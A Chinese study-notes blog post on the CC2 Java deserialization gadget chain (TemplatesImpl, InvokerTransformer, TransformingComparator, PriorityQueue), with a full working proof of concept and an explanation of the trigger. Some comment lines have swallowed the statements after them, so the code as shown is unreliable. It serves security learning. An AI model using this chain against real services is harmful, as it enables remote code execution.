---
title: "cc2学习"
date: "2026-11-10 16:47:24"
updated: "2026-11-10 16:47:24"
permalink: "2026/11/10/cc2-study/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC2"]
description: "CC2 学习记录：对比 CC4 的中段调用方式，梳理 InvokerTransformer、TransformingComparator 与 PriorityQueue 的构造及反序列化触发过程。"
excerpt: "CC2 学习记录：对比 CC4 的中段调用方式，梳理 InvokerTransformer、TransformingComparator 与 PriorityQueue 的构造及反序列化触发过程。"
obsidian_source: "cc2学习.md"
---

今天开始cc2的学习了，前几天因为电脑坏了导致我的学习被迫中断了几天
现在是北京时间十一月十日 十五点五十四分
cc2和我们之前学习的cc4差别不是很大，主要是中段类的不同，cc4采用的是`ChainedTransformer` + `ConstantTransformer` + `InstantiateTransformer` ，而在cc2的中段类直接采用的是invoketransformer
我们直接把cc4复制过来修改一下
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import javax.xml.crypto.dsig.Transform;  
import javax.xml.transform.Templates;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class cccc {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
//        前面这一部分就是通过读取恶意类来实现代码执行的，接下来就要完成实例化来触发类加载  
        InvokerTransformer<Object, Object> newTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});  
  
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));  
  
  
        PriorityQueue<Object> queue = new PriorityQueue<>(transformingComparator);  
        queue.add(templates);  
        queue.add(templates);  
        Class<? extends TransformingComparator> aClass1 = transformingComparator.getClass();  
        Field transformer = aClass1.getDeclaredField("transformer");  
        transformer.setAccessible(true);  
        transformer.set(transformingComparator,newTransformer);  
  
        // ===== 新增：序列化 =====        byte[] ser = serialize(queue);  
        System.out.println("[*] serialized bytes length = " + ser.length);  
  
        // ===== 新增：反序列化 =====        deserialize(ser);  
    }  
  
    // ===== 新增：序列化方法 =====    public static byte[] serialize(Object obj) throws Exception {  
        ByteArrayOutputStream bos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(bos);  
        oos.writeObject(obj);  
        oos.flush();  
        oos.close();  
        return bos.toByteArray();  
    }  
  
    // ===== 新增：反序列化方法 =====    public static Object deserialize(byte[] data) throws Exception {  
        ByteArrayInputStream bis = new ByteArrayInputStream(data);  
        ObjectInputStream ois = new ObjectInputStream(bis);  
        Object obj = ois.readObject();  
        ois.close();  
        return obj;  
    }  
}
```
看完代码我们理一下思路，毕竟好几天没学习了
首先进行的是我们前面学习过的部分，直接通过通过字节码直接加载恶意类中的代码，
接下来我们要考虑怎么去执行new。。。那个方法，就如我们之前所说这里是通过`ChainedTransformer` + `ConstantTransformer` + `InstantiateTransformer` 来实现的
现在我们不使用Transformer数组，使用反射来进行调用
最后的运行逻辑是什么样的呢，
首先我们对TransformingComparator上传的参数是一个空包弹，我们把template add进去之后，两个元素进行比较，自然调用了transform这个方法，但是这个constanttransform无论参数是什么都返回固定值，因此不会触发命令执行，然后我们通过反射把这个参数换成我们准备好的，在反序列化的时候重新进行比较这样就会变成invoketransformer触发transform方法从而实现命令执行。完成本次实验

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/) · [cc4链的学习](/2026/11/06/cc4-study/) · [cc2学习](/2026/11/10/cc2-study/)
